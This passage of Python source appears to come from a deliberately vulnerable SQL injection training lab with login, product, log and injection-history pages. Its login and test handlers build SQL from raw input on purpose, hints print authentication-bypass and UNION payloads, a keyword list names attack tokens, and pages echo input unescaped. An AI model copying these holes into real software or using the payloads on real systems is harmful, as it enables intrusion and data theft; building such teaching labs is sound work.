                    <a href="/injection-history">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="product-list">
                        <h3>Your Products</h3>
        """
        
        if products:
            html += "<table class='product-table'>"
            html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th></tr>"
            for product in products:
                html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td></tr>"
            html += "</table>"
        else:
            html += "<p>No products found for this user.</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_all_products(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        products = lab.get_all_products() if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>All Products - SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>All Products</h1>
                    <p class="subtitle">Products across all users</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products" class="active">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="product-list">
                        <h3>All Products</h3>
        """
        
        if products:
            html += "<table class='product-table'>"
            html += "<tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th><th>Stock</th><th>Category</th><th>Owner</th></tr>"
            for product in products:
                html += f"<tr><td>{product['id']}</td><td>{product['name']}</td><td>${product['price']}</td><td>{product['description']}</td><td>{product['stock']}</td><td>{product['category']}</td><td>{product['owner']}</td></tr>"
            html += "</table>"
        else:
            html += "<p>No products found.</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_users(self, params):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        users = lab.get_users() if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Users - SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Users</h1>
                    <p class="subtitle">All registered users</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users" class="active">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="user-list">
                        <h3>Registered Users</h3>
                        <table class="user-table">
                            <tr><th>ID</th><th>Username</th><th>Role</th><th>Department</th><th>Email</th><th>Phone</th><th>Created</th></tr>
        """
        
        for user in users:
            html += f"<tr><td>{user['id']}</td><td>{user['username']}</td><td>{user['role']}</td><td>{user['department']}</td><td>{user['email']}</td><td>{user['phone']}</td><td>{user['created_at']}</td></tr>"
        
        html += """
                        </table>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_logs(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Logs - SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Audit Logs</h1>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs" class="active">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="log-list">
                        <h3>Recent Activity</h3>
                        <table class="log-table">
                            <tr><th>User</th><th>Action</th><th>IP</th><th>Timestamp</th></tr>
        """
        
        for log in lab.get_logs(50):
            html += f"<tr><td>{log['username']}</td><td>{log['action']}</td><td>{log['ip']}</td><td>{log['timestamp']}</td></tr>"
        
        html += """
                        </table>
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_injection_history(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        lab = self.lab_instance
        attempts = lab.get_injection_attempts(50) if lab else []
        
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Injection History - SQL Injection Lab</title>
            <link rel="stylesheet" href="/styles.css">
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>Injection History</h1>
                    <p class="subtitle">Record of all SQL injection attempts</p>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history" class="active">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="content">
                    <div class="history-list">
                        <h3>SQL Injection Attempts</h3>
        """
        
        if attempts:
            html += """
            <table class="history-table">
                <tr>
                    <th>Technique</th>
                    <th>Payload</th>
                    <th>User</th>
                    <th>Success</th>
                    <th>Timestamp</th>
                </tr>
            """
            for attempt in attempts:
                success_class = "success-badge" if attempt['success'] else "fail-badge"
                success_text = "Yes" if attempt['success'] else "No"
                html += f"""
                <tr>
                    <td><span class="tech-badge">{attempt['technique']}</span></td>
                    <td><code class="payload-code">{attempt['payload']}</code></td>
                    <td>{attempt['username']}</td>
                    <td class="{success_class}">{success_text}</td>
                    <td style="font-size:12px;color:#888;">{attempt['timestamp']}</td>
                </tr>
                """
            html += "</table>"
        else:
            html += "<p>No injection attempts recorded yet. Try some SQL injection techniques on the login page!</p>"
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_techniques(self):
        cookies = self.headers.get('Cookie', '')
        if 'logged_in=1' not in cookies:
            self._send_error(401, "Please login first")
            return
        
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>SQL Injection Techniques - Learning Lab</title>
            <link rel="stylesheet" href="/styles.css">
            <style>
            .techniques-page {{ padding: 20px; }}
            .techniques-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
                gap: 20px;
                margin-top: 20px;
            }}
            .technique-card {{
                background: #161b22;
                border-radius: 10px;
                border: 1px solid #30363d;
                overflow: hidden;
                transition: all 0.3s;
            }}
            .technique-card:hover {{
                border-color: #00ffff;
                transform: translateY(-2px);
            }}
            .technique-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 15px 20px;
                background: #1a1a2e;
                border-bottom: 1px solid #30363d;
            }}
            .technique-header h4 {{
                color: #00ffff;
                margin: 0;
                font-size: 16px;
            }}
            .tech-badge {{
                background: #00ffff22;
                color: #00ffff;
                padding: 2px 12px;
                border-radius: 12px;
                font-size: 12px;
            }}
            .technique-body {{ padding: 20px; }}
            .technique-body p {{
                color: #c9d1d9;
                font-size: 14px;
                margin-bottom: 12px;
                line-height: 1.6;
            }}
            .tech-example {{
                background: #0d1117;
                padding: 10px 15px;
                border-radius: 5px;
                border: 1px solid #30363d;
                margin: 10px 0;
            }}
            .tech-example code {{
                color: #ffcc00;
                font-family: 'Consolas', monospace;
                font-size: 14px;
            }}
            .tech-details {{
                margin: 12px 0;
            }}
            .tech-details summary {{
                color: #00ffff;
                cursor: pointer;
                padding: 8px 0;
                font-weight: bold;
            }}
            .tech-details p {{
                color: #c9d1d9;
                padding: 12px;
                background: #0d1117;
                border-radius: 5px;
                margin-top: 8px;
                font-size: 13px;
                line-height: 1.6;
            }}
            .tech-payloads {{
                margin-top: 12px;
            }}
            .tech-payloads h5 {{
                color: #ffcc00;
                margin-bottom: 8px;
                font-size: 14px;
            }}
            .tech-payloads ul {{
                list-style: none;
                padding: 0;
            }}
            .tech-payloads li {{
                padding: 4px 0;
                font-family: 'Consolas', monospace;
                font-size: 13px;
                color: #00ff88;
                border-bottom: 1px solid #1a1a2e;
            }}
            .tech-payloads li:last-child {{ border-bottom: none; }}
            .payload-code {{
                background: #0d1117;
                padding: 2px 8px;
                border-radius: 3px;
                font-size: 13px;
            }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>SQL Injection Techniques</h1>
                    <p class="subtitle">Complete guide to SQL injection attack vectors</p>
                    <div style="margin-top:10px;">
                        <button onclick="location.href='/download-pdf'" class="pdf-download-btn" style="padding:10px 30px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:bold;cursor:pointer;">
                            Download PDF Notes
                        </button>
                    </div>
                </div>
                
                <div class="nav-bar">
                    <a href="/dashboard">Dashboard</a>
                    <a href="/products">My Products</a>
                    <a href="/all-products">All Products</a>
                    <a href="/users">Users</a>
                    <a href="/logs">Logs</a>
                    <a href="/injection-history">Injection History</a>
                    <a href="/logout">Logout</a>
                </div>
                
                <div class="techniques-page">
                    <div class="techniques-grid">
        """
        
        for tech_id, tech_data in SQL_INJECTION_TECHNIQUES.items():
            html += f"""
            <div class="technique-card">
                <div class="technique-header">
                    <h4>{tech_data['name']}</h4>
                    <span class="tech-badge">{len(tech_data['payloads'])} payloads</span>
                </div>
                <div class="technique-body">
                    <p>{tech_data['description']}</p>
                    <div class="tech-example">
                        <code>{tech_data['example']}</code>
                    </div>
                    <details class="tech-details">
                        <summary>How it works</summary>
                        <p>{tech_data['explanation']}</p>
                    </details>
                    <div class="tech-payloads">
                        <h5>Payloads:</h5>
                        <ul>
            """
            for payload in tech_data['payloads']:
                html += f"<li><code class='payload-code'>{payload}</code></li>"
            html += """
                        </ul>
                    </div>
                    <button onclick="location.href='/login'" class="test-btn" style="margin-top:15px;">
                        Go to Login & Test
                    </button>
                </div>
            </div>
            """
        
        html += """
                    </div>
                </div>
                
                <div class="footer">
                    <p>Educational Use Only | DSTERMINAL Enterprise Edition</p>
                    <p style="font-size:0.7em;color:#444;margin-top:5px;">
                        For more info: <a href="mailto:starkec.team@outlook.com" style="color:#00ffff;">starkec.team@outlook.com</a> | 
                        <a href="mailto:info@starkteamsupport.mw" style="color:#00ffff;">info@starkteamsupport.mw</a>
                    </p>
                </div>
            </div>
        </body>
        </html>
        """
        self._send_html(html)
    
    def _serve_logout(self):
        self.send_response(302)
        self.send_header('Location', '/login')
        self.send_header('Set-Cookie', 'logged_in=0; Max-Age=0')
        self.end_headers()
    
    def _serve_reset(self):
        lab = self.lab_instance
        lab.reset_database()
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def _serve_css(self):
        css = """
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
            color: #c9d1d9;
            min-height: 100vh;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 2px solid #00ffff;
            margin-bottom: 30px;
        }
        .header h1 { color: #00ffff; font-size: 2.5em; }
        .subtitle { color: #888; font-size: 1.1em; margin-top: 5px; }
        .header-controls {
            margin-top: 15px;
            display: flex;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
        }
        .learning-toggle-btn {
            padding: 10px 25px;
            background: linear-gradient(135deg, #00ffff, #0088ff);
            color: #0d1117;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .learning-toggle-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
        }
        .pdf-download-btn {
            padding: 10px 25px;
            background: linear-gradient(135deg, #ff8800, #ff5500);
            color: #fff;
            border: none;
            border-radius: 25px;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        .pdf-download-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
        }
        .btn-pdf {
            background: linear-gradient(135deg, #ff8800, #ff5500) !important;
            color: #fff !important;
        }
        .btn-pdf:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(255, 136, 0, 0.3);
        }
        .nav-bar {
            display: flex;
            gap: 20px;
            padding: 15px;
            background: #161b22;
            border-radius: 10px;
            margin-bottom: 30px;
            border: 1px solid #30363d;
            flex-wrap: wrap;
        }
        .nav-bar a {
            color: #c9d1d9;
            text-decoration: none;
            padding: 8px 16px;
            border-radius: 5px;
            transition: all 0.3s;
        }
        .nav-bar a:hover { background: #30363d; }
        .nav-bar a.active { background: #00ffff; color: #0d1117; }
        
        .login-box {
            max-width: 400px;
            margin: 40px auto;
            padding: 40px;
            background: #161b22;
            border-radius: 15px;
            border: 1px solid #30363d;
        }
        .login-box h2 { color: #00ffff; margin-bottom: 20px; text-align: center; }
        .login-box .info { color: #888; text-align: center; margin-bottom: 20px; font-size: 0.9em; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 5px; color: #c9d1d9; }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #30363d;
            border-radius: 5px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 14px;
        }
        .form-group input:focus { outline: none; border-color: #00ffff; }
        button {
            width: 100%;
            padding: 12px;
            background: #00ffff;
            color: #0d1117;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover { background: #00dddd; transform: scale(1.02); }
        .hint {
            margin-top: 20px;
            padding: 15px;
            background: #0d1117;
            border-radius: 5px;
            border-left: 3px solid #ffcc00;
        }
        .hint code { background: #30363d; padding: 2px 6px; border-radius: 3px; color: #ffcc00; }
        .hint ul li { padding: 3px 0; font-size: 13px; }
        .small { font-size: 0.8em; color: #888; margin-top: 5px; }
        .footer {
            text-align: center;
            padding: 20px;
            margin-top: 40px;
            border-top: 1px solid #30363d;
            color: #666;
            font-size: 0.8em;
        }
        .footer a { color: #00ffff; text-decoration: none; }
        .footer a:hover { text-decoration: underline; }
        
        .dashboard-content { display: grid; gap: 20px; }
        .status-banner {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 2px solid #ffcc00;
            text-align: center;
        }
        .status-banner h3 { color: #ffcc00; margin-bottom: 5px; }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
        }
        .stat-card {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #30363d;
        }
        .stat-card h3 { color: #888; font-size: 0.9em; margin-bottom: 5px; }
        .stat-number { font-size: 2.5em; color: #00ffff; font-weight: bold; }
        .admin-section, .lab-section, .info-box {
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 1px solid #30363d;
        }
        .admin-section h3, .lab-section h3, .info-box h3 { color: #00ffff; margin-bottom: 15px; }
        .inline { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .inline input { flex: 1; min-width: 150px; }
        .inline button { width: auto; padding: 10px 20px; }
        .lab-controls { display: flex; gap: 10px; flex-wrap: wrap; }
        .lab-controls button {
            width: auto;
            padding: 10px 20px;
            font-size: 14px;
        }
        .btn-secure { background: #00ff88; }
        .btn-vulnerable { background: #ff5555; }
        .btn-reset { background: #ffcc00; color: #0d1117; }
        .btn-learning { background: #00ffff; color: #0d1117; }
        
        .product-table, .user-table, .log-table, .history-table, .injection-history-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            overflow-x: auto;
            display: block;
        }
        .product-table th, .user-table th, .log-table th, .history-table th, .injection-history-table th {
            background: #21262d;
            padding: 10px;
            text-align: left;
            color: #00ffff;
            border: 1px solid #30363d;
        }
        .product-table td, .user-table td, .log-table td, .history-table td, .injection-history-table td {
            padding: 10px;
            border: 1px solid #30363d;
        }
        .history-table { font-size: 13px; }
        .history-table td code { font-size: 12px; }
        .success-badge { color: #00ff88; font-weight: bold; }
        .fail-badge { color: #ff5555; font-weight: bold; }
        .tech-badge {
            background: #00ffff22;
            color: #00ffff;
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 12px;

            display: inline-block;
        }
        .payload-code {
            background: #0d1117;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Consolas', monospace;
            font-size: 12px;
            color: #00ff88;
        }
        .user-list-hint {
            max-width: 600px;
            margin: 20px auto;
            padding: 20px;
            background: #161b22;
            border-radius: 10px;
            border: 1px solid #30363d;
        }
        .user-list-hint h4 { color: #00ffff; margin-bottom: 10px; }
        .user-hint-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.9em;
        }
        .user-hint-table th {
            text-align: left;
            padding: 8px;
            color: #888;
            border-bottom: 1px solid #30363d;
        }
        .user-hint-table td {
            padding: 8px;
            border-bottom: 1px solid #1a1a2e;
        }
        .username { color: #00ffff; }
        .role { color: #ffcc00; }
        .dept { color: #888; }
        
        @media (max-width: 768px) {
            .inline { flex-direction: column; }
            .stats-grid { grid-template-columns: 1fr; }
            .nav-bar { flex-direction: column; align-items: stretch; }
        }
        """
        self.send_response(200)
        self.send_header('Content-Type', 'text/css')
        self.end_headers()
        self.wfile.write(css.encode('utf-8'))
    
    def _handle_login(self, params):
        username = params.get('username', [''])[0]
        password = params.get('password', [''])[0]
        
        lab = self.lab_instance
        if not lab:
            self._send_error(500, "Lab not initialized")
            return
        
        is_injection = any(char in username for char in ["'", '"', ';', '--', '/*', '*/', 'UNION', 'SELECT', 'DROP', 'DELETE', 'SLEEP', 'BENCHMARK', 'WAITFOR', 'xp_cmdshell'])
        
        if not lab.secure_mode:
            query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
            print(f"[DEBUG] Vulnerable query: {query}")
            try:
                conn = lab._get_db_connection()
                if conn:
                    cursor = conn.cursor()
                    cursor.execute(query)
                    result = cursor.fetchone()
                    conn.close()
                    
                    if result:
                        print(f"[DEBUG] Query returned a result!")
                        user = lab.get_user_by_username(username)
                        
                        if not user:
                            print(f"[DEBUG] User not found by username, getting first user...")
                            conn2 = lab._get_db_connection()
                            if conn2:
                                cursor2 = conn2.cursor()
                                cursor2.execute("SELECT id, username FROM users ORDER BY id LIMIT 1")
                                first_user = cursor2.fetchone()
                                conn2.close()
                                if first_user:
                                    user = lab.get_user_by_username(first_user[1])
                                    print(f"[DEBUG] Found first user: {user['username'] if user else 'None'}")
                        
                        if user:
                            print(f"[DEBUG] Login successful for user: {user['username']}")
                            if is_injection:
                                technique = lab.detect_technique(username)
                                lab.log_injection_attempt(technique, username, user['username'], success=True)
                            lab.add_log(user['username'], f"Login successful (vulnerable mode) - Injection: {is_injection}")
                            lab._update_last_login(user['id'])
                            
                            self.send_response(302)
                            self.send_header('Location', '/dashboard')
                            self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                            self.send_header('Set-Cookie', f'username={user["username"]}; Path=/; HttpOnly')
                            self.send_header('Content-Length', '0')
                            self.end_headers()
                            return
                        else:
                            print(f"[DEBUG] No user found despite query returning result!")
                    else:
                        print(f"[DEBUG] Query returned no results")
            except Exception as e:
                error_msg = str(e)
                print(f"[DEBUG] Vulnerable query error: {error_msg}")
                
                if 'UNION' in error_msg and ('columns' in error_msg or 'number of result columns' in error_msg):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        lab.add_log('test_user', f"UNION injection attempt - column mismatch")
                        self._serve_login_form(
                            error="UNION injection detected! The number of columns in UNION SELECT doesn't match.",
                            message="Try changing the number of columns. The users table has 8 columns!\nExample: ' UNION SELECT 1,2,3,4,5,6,7,8 --"
                        )
                        return
                
                elif 'SLEEP' in username.upper() or 'WAITFOR' in username.upper() or 'BENCHMARK' in username.upper():
                    if is_injection:
                        technique = lab.detect_technique(username)
                        lab.log_injection_attempt(technique, username, 'test_user', success=True)
                        lab.add_log('test_user', f"Time-based injection detected: {technique}")
                        self._serve_login_form(
                            error=f"Time-based injection detected! Technique: {technique}",
                            message=f"The database is executing your time-based payload. If you see a delay, it worked!\nPayload: {username[:100]}"
                        )
                        return
                
                elif any(cmd in username.upper() for cmd in ['DROP', 'DELETE', 'UPDATE', 'INSERT', 'ALTER', 'CREATE', 'TRUNCATE']):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        lab.log_injection_attempt(technique, username, 'test_user', success=True)
                        lab.add_log('test_user', f"Stacked query injection detected: {technique}")
                        self._serve_login_form(
                            error=f"Stacked query injection detected! Technique: {technique}",
                            message=f"The database is executing your stacked query. Check the logs to see what happened!\nPayload: {username[:100]}"
                        )
                        return
                
                elif ' AND ' in username.upper() and ('1=1' in username or '1=2' in username):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        lab.log_injection_attempt(technique, username, 'test_user', success=False)
                        lab.add_log('test_user', f"Boolean-based injection attempted: {technique}")
                        self._serve_login_form(
                            error=f"Boolean-based injection detected! Technique: {technique}",
                            message=f"Check if the application responds differently to '1=1' vs '1=2'.\nPayload: {username[:100]}"
                        )
                        return
                
                elif "OR" in username.upper() and ("'" in username or '"' in username):
                    if is_injection:
                        technique = lab.detect_technique(username)
                        lab.log_injection_attempt(technique, username, 'test_user', success=False)
                        lab.add_log('test_user', f"Basic OR injection attempted: {technique}")
                        self._serve_login_form(
                            error=f"Basic OR injection detected but failed! Technique: {technique}",
                            message="Try these OR bypass payloads:\n   - ' OR '1'='1' --\n   - ' OR 1=1 --\n   - ' OR 'x'='x\n   - admin' --"
                        )
                        return
                
                elif is_injection:
                    technique = lab.detect_technique(username)
                    lab.log_injection_attempt(technique, username, 'test_user', success=False)
                    lab.add_log('test_user', f"Injection attempt failed: {technique}")
                    self._serve_login_form(
                        error=f"Injection attempt detected but failed! Technique: {technique}",
                        message="Try different payloads or check if secure mode is enabled."
                    )
                    return
        
        try:
            conn = lab._get_db_connection()
            if conn:
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT * FROM users WHERE username = ? AND password = ?",
                    (username, password)
                )
                result = cursor.fetchone()
                conn.close()
                
                if result:
                    user = lab.get_user_by_username(username)
                    if user:
                        if is_injection:
                            technique = lab.detect_technique(username)
                            lab.log_injection_attempt(technique, username, username, success=False)
                        lab.add_log(username, "Login successful (secure mode)")
                        lab._update_last_login(user['id'])
                        self.send_response(302)
                        self.send_header('Location', '/dashboard')
                        self.send_header('Set-Cookie', f'logged_in=1; Path=/; HttpOnly')
                        self.send_header('Set-Cookie', f'username={username}; Path=/; HttpOnly')
                        self.send_header('Content-Length', '0')
                        self.end_headers()
                        return
        except Exception as e:
            print(f"[DEBUG] Secure query error: {e}")
        
        if is_injection:
            technique = lab.detect_technique(username)
            lab.log_injection_attempt(technique, username, username, success=False)
            lab.add_log(username, f"Injection attempt failed: {technique}")
            self._serve_login_form(error=f"Injection attempt detected but failed! Technique: {technique}")
            return
        
        lab.add_log(username, "Login failed")
        self._serve_login_form(error="Invalid username or password!")
        
    def _handle_test_injection(self, params):
        technique = params.get('technique', [''])[0]
        payload = params.get('payload', [''])[0]
        
        lab = self.lab_instance
        if not lab:
            self._send_html("<p style='color:#ff5555;'>Lab not initialized</p>")
            return
        
        query = f"SELECT * FROM users WHERE username = '{payload}' AND password = 'test'"
        
        try:
            conn = lab._get_db_connection()
            if conn:
                cursor = conn.cursor()
                cursor.execute(query)
                result = cursor.fetchone()
                conn.close()
                
                if result:
                    lab.log_injection_attempt(technique, payload, 'test_user', success=True)
                    html = f"""
                    <div style="color:#00ff88;">
                        <h3>Injection Successful!</h3>
                        <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> successfully bypassed authentication!</p>
                        <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #00ff8844;">
                            <p style="color:#c9d1d9;font-size:13px;">The injection worked because the application is vulnerable. The query became:</p>
                            <code style="display:block;padding:8px;background:#1a1a2e;border-radius:3px;color:#00ff88;font-size:12px;margin-top:5px;">{query}</code>
                        </div>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ffcc0044;">
                            <p style="color:#ffcc00;font-size:13px;">What happened: The OR condition made the WHERE clause always TRUE, and the -- commented out the password check.</p>
                        </div>
                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">Go to Login</button>
                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">Download PDF Notes</button>
                    </div>
                    """
                else:
                    lab.log_injection_attempt(technique, payload, 'test_user', success=False)
                    html = f"""
                    <div style="color:#ff5555;">
                        <h3>Injection Failed</h3>
                        <p>The payload <code style="background:#1a1a2e;padding:2px 8px;border-radius:3px;color:#ffcc00;">{payload}</code> did not bypass authentication.</p>
                        <p style="margin-top:10px;color:#888;">Technique: <span class="tech-badge">{technique}</span></p>
                        <div style="margin-top:10px;padding:10px;background:#0d1117;border-radius:5px;border:1px solid #ff555544;">
                            <p style="color:#c9d1d9;font-size:13px;">The injection did not work because:</p>
                            <ul style="list-style:none;padding:0;margin-top:5px;">
                                <li style="padding:3px 0;">- The application may be using parameterized queries</li>
                                <li style="padding:3px 0;">- The payload syntax may be incorrect for this database</li>
                                <li style="padding:3px 0;">- Secure mode may be enabled</li>
                            </ul>
                        </div>
                        <button onclick="location.href='/login'" style="margin-top:15px;padding:8px 20px;background:#00ffff;color:#0d1117;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;">Go to Login</button>
                        <button onclick="location.href='/download-pdf'" style="margin-top:15px;padding:8px 20px;background:linear-gradient(135deg,#ff8800,#ff5500);color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold;width:auto;margin-left:10px;">Download PDF Notes</button>
                    </div>
                    """
            else:
                html = "<p style='color:#ff5555;'>Database connection error</p>"
        except Exception as e:
            html = f"<p style='color:#ff5555;'>Error testing injection: {e}</p>"
        
        self._send_html(html)
    
    def _handle_secure_login(self, params):
        mode = params.get('mode', [''])[0]
        lab = self.lab_instance
        
        if mode == 'enable':
            lab.set_secure_mode(True)
            lab.add_log('admin', 'Secure mode enabled')
        elif mode == 'disable':
            lab.set_secure_mode(False)
            lab.add_log('admin', 'Secure mode disabled')
        
        self.send_response(302)
        self.send_header('Location', '/dashboard')
        self.end_headers()
    
    def _handle_update_credentials(self, params):
        new_username = params.get('new_username', [''])[0]
        new_password = params.get('new_password', [''])[0]
        lab = self.lab_instance
        
        if new_username and new_password and lab:
            if lab.update_credentials(new_username, new_password):
                lab.add_log(new_username, "Admin credentials updated")
                self.send_response(302)
                self.send_header('Location', '/dashboard')
                self.send_header('Set-Cookie', f'username={new_username}; Path=/')
                self.end_headers()
                return
        
        self.send_response(302)
        self.send_header('Location', '/dashboard?error=update_failed')
        self.end_headers()


# ============================================================
# SQLMAP SCANNER CLASS
# ============================================================

class SQLMapScanner:
    def __init__(self, verbose: bool = True):
        self.console = Console() if RICH_AVAILABLE else None
        self.verbose = verbose
        self.app_dir = self._get_app_dir()
        self.workspace = os.path.expanduser("~/DSTerminal_Workspace")
